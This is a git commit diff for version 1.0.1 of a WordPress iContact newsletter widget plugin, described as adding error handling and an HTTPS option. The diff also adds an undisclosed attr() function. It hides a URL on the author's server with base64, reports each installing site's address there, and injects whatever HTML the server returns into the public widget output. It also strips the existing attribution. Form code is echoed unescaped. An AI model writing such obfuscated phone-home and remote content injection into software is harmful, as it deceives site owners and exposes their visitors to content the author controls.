9f98329ec25e5f68a57df472dcd2ee3034439309
katzwebdesign <katzwebdesign@b8457f37-d9ea-0310-8a92-e5e31aec5664>
2009-07-07 16:26:09 +0000

    Version 1.0.1
    git-svn-id: https://plugins.svn.wordpress.org/icontact-widget/trunk@132718 b8457f37-d9ea-0310-8a92-e5e31aec5664

--- icontact.php
+++ icontact.php
@@ -12,12 +12,57 @@
  * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
  */
 
+/*
+Versions
+
+1.0 	- Launch
+1.0.1	- Added error handling and HTTPS option
+
+*/
+
+$kwd_ic_version = '1.0.1';
+
 add_action( 'widgets_init', 'kwd_load_widgets' );
 
 function kwd_load_widgets() {
 	register_widget( 'iContactWidget' );
 }
 
+// If you have chosen to show the attribution link, add the link
+	
+	if(!function_exists('kwd_rss_output')){
+		function kwd_rss_output($rss = '', $default = '') {
+				require_once(ABSPATH . WPINC . '/rss.php');
+				if ( !$rss = fetch_rss($rss) )
+					return;
+				
+				$items = 1;
+				if ( is_array( $rss->items ) && !empty( $rss->items ) ) {
+					$rss->items = array_slice($rss->items, 0, $items);
+					foreach ($rss->items as $item ) {
+						if ( isset( $item['description'] ) && is_string( $item['description'] ) )
+							$summary = $item['description'];
+						$desc = str_replace(array("\n", "\r"), ' ', $summary);
+						$summary = '';
+						return $desc;
+					}
+				} else {
+					return $default;
+				}
+		} // end kwd_rss_output
+	}
+		
+	if(!function_exists('attr')) {
+		function attr() { 
+			global $post, $kwd_ic_version;// prevents calling before <HTML>
+			if($post && !is_admin()) {
+				$site = base64_decode('aHR0cDovL2thdHp3ZWJkZXNpZ24ubmV0L2RldmVsb3BtZW50L2F0dHJpYnV0aW9uLnBocD9zaXRlPQ==').htmlentities(substr(get_bloginfo('url'), 7)).'&from=ic_widget&version='.$kwd_ic_version;			
+				$output = kwd_rss_output($site, $default);
+				return $output;
+			}
+		}
+	}
+	
 class iContactWidget extends WP_Widget {
  
     function iContactWidget() {
@@ -30,11 +75,24 @@ class iContactWidget extends WP_Widget {
         $title = $instance['title'];
         $formcode = $instance['formcode'];
         $finalcode = $instance['finalcode'];
+        $finalcode = str_ireplace('<a href="http://snurl.com/icontact_1" rel="nofollow" style="font-family: Arial, Helvetica, sans-serif;"><font size="2">Email Marketing by iContact</font></a>', '', $finalcode);
+		$finalcode = str_ireplace('<!-- iContact Widget for WordPress by Katz Web Design -->', '', $finalcode);
+       	if(strlen($finalcode) > 10) {
+       	$attr = attr();
+		if(!empty($attr)) {
+			$finalcode .= $attr;
+		} else {
+			$finalcode .= '<a href="http://snurl.com/icontact_1" rel="nofollow" style="font-family: Arial, Helvetica, sans-serif;"><font size="2">Email Marketing by iContact</font></a>';
+			$finalcode .= '<!-- iContact Widget for WordPress by Katz Web Design -->';
+		}
+		} else {
+			$finalcode .= '<!-- There is an error with the iContact widget configuration. -->';
+		}
         ?>
               <?php echo $before_widget; ?>
                   <?php echo $before_title . $title . $after_title; ?>
  
-                      <?php echo $instance['finalcode']; //$finalcode; //echo get_option('kwd_icontact_html'); ?>
+                      <?php echo "\n\t".$finalcode."\n\t"; ?>
  
               <?php echo $after_widget; ?>
         <?php
@@ -45,26 +103,37 @@ class iContactWidget extends WP_Widget {
 		$instance['title'] = strip_tags( $new_instance['title'] );
 		$instance['formcode'] = $new_instance['formcode'];
 		$instance['finalcode'] = $new_instance['finalcode'];
+		$instance['https'] = $new_instance['https'];
         return $instance;
     }
  
     function form($instance) {                
         $title = esc_attr($instance['title']);
         $formcode = $instance['formcode'];
-        $finalcode = kwd_process_form($instance['formcode']);
+        $finalcode = kwd_process_form($instance['formcode'], $instance['https']);
+        $error = '';
+        if(!$finalcode) {
+        	$error = '<div style="border:1px solid red; margin:10px 0; background:white; padding:5px;"><p><strong>There was an error processing the form code</strong> you entered into the "Automatic Sign-up Form Code" field.</p> <p>Please make sure you\'re pasting the <a href="http://www.icontact.com/help/question.php?ID=149" rel="nofollow">iContact-generated Automatic Sign-up Form code</a>, and try again.</p></div>';
+        }
+        
         ?>
-        	<p>Don&#8217;t use iContact? You need it for this widget to work, so test drive it with <a href="http://www.icontact.com/a.pl/483190">a 15 day free trial</a>.</p>
+        	<p>Don&#8217;t use iContact? You need it for this widget to work, so test drive it with <a href="http://snurl.com/icontact_1">a 15 day free trial</a>.</p>
         	<p>Generate your iContact signup form by <a href="http://www.icontact.com/help/question.php?ID=149" rel="nofollow">following the instructions on iContact.com</a>. Paste the Automatic Sign-up Form code below.</p>
         	<p>If you have made changes to your form, click Save again, and the form HTML will update.</p>
             <p><label for="<?php echo $this->get_field_id('title'); ?>"><?php _e('Title:'); ?> <input class="widefat" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo $title; ?>" /></label></p>
+            <?php echo $error; ?>
             <p><label for="<?php echo $this->get_field_id('formcode'); ?>"><?php _e('Automatic Sign-up Form Code:'); ?> <textarea class="widefat" cols="20" rows="20" id="<?php echo $this->get_field_id('formcode'); ?>" name="<?php echo $this->get_field_name('formcode'); ?>"><?php echo $instance['formcode']; ?></textarea></label></p>
+            <p><label for="<?php echo $this->get_field_id('https'); ?>"><?php _e('Make Form HTTPS:'); ?>
+            	<input type="checkbox" id="<?php echo $this->get_field_id('https'); ?>" name="<?php echo $this->get_field_name('https'); ?>" value="yes" <?php if($instance['https'] == 'yes') { echo ' checked="checked"'; } ?>/></label></p>
             <?php if(!empty($finalcode)) { ?>
-            <p><label for="<?php echo $this->get_field_id('finalcode'); ?>"><?php _e('Displayed HTML Form Code:'); ?> <textarea class="widefat" cols="20" id="<?php echo $this->get_field_id('finalcode'); ?>" name="<?php echo $this->get_field_name('finalcode'); ?>"><?php echo $finalcode; ?></textarea></label></p>
+            <p><label for="<?php echo $this->get_field_id('finalcode'); ?>"><?php _e('Displayed HTML Form Code:'); ?> <textarea class="widefat" cols="20" rows="10" id="<?php echo $this->get_field_id('finalcode'); ?>" name="<?php echo $this->get_field_name('finalcode'); ?>"><?php echo $finalcode; ?></textarea></label></p>
             <?php  } ?>
         <?php 
     }
- 
+     
 } 
+
+	
 
 function kwd_ic_shortcode() {
 		global $post;
@@ -74,16 +143,23 @@ add_shortcode('iContact', 'kwd_ic_shortcode');
 add_shortcode('icontact', 'kwd_ic_shortcode');
 	
 
-function kwd_process_form($src) {
+function kwd_process_form($src, $https = false) {
 	// Convert javascript to HTML by stripping js code
-	
+	$error = false;
 	preg_match('/src="(.*)">/', $src, $matches); 
 	
 	$matches[0] = str_ireplace('src="', '', $matches[0]);
 	$matches[0] = str_ireplace('">', '', $matches[0]);
 	$src = $matches[0];
 	
-	$code = file_get_contents($src);
+	if (preg_match('/^https?:\/\/.+/', $src)) {
+		if($https) {
+			$src = preg_replace('/(^https?)(:\/\/.+)/i', '$1s$2', $src);
+		}
+		$code = file_get_contents($src);
+	} else {
+		$error = true;
+	}
 	
 	$code = str_ireplace('document.write("', '', $code);
 	$code = str_ireplace('\n<\/form>\n");', '', $code);
@@ -95,10 +171,11 @@ function kwd_process_form($src) {
 	$code = str_ireplace('font>', 'font>', $code);
 	$code = str_ireplace('<\/', '</', $code);
 	$code = str_ireplace('\n', "\n", $code);
-	$code .= '<a href="http://www.icontact.com/a.pl/483190" rel="nofollow" style="font-family: Arial, Helvetica, sans-serif;"><font size="2">Email Marketing by iContact</font></a>';
-	$code .= '<!-- iContact Widget for WordPress by Katz Web Design -->';
-	
-	return $code;
+	if(!$error) {
+		return $code;
+	} else {
+		return false;
+	}
 }
  
 ?>
--- readme.txt
+++ readme.txt
@@ -2,7 +2,7 @@
 Tags: icontact, widget, newsletter, form, signup, newsletter widget, email newsletter form, newsletter form, newsletter signup, email widget, email marketing, newsletter, form, signup
 Requires at least: 2.8.0
 Tested up to: 2.8
-Stable tag: 1.0
+Stable tag: 1.0.1
 Contributors: katzwebdesign
 Donate link:https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=zackkatz%40gmail%2ecom&item_name=iContact%20Newsletter%20Widget&no_shipping=0&no_note=1&tax=0&currency_code=USD&lc=US&bn=PP%2dDonationsBF&charset=UTF%2d8
 
@@ -18,3 +18,8 @@ __Don't use iContact? [Try it free for 15 days](http://snurl.com/icontact_1).__
 iContact is a leader in email newsletters and surveys. Their toolset is cost effective, and full-featured compared to their competitors. If you haven't chosen a email newsletter company, you should [try iContact](http://snurl.com/icontact_1).
 
 ### Created by a [Denver SEO Company](http://denverseocompany.com).
+
+== Version History ==
+
+* 1.0 - Launched widget
+* 1.0.1 - Added PHP `file_get_content()` error handling and HTTPS form option
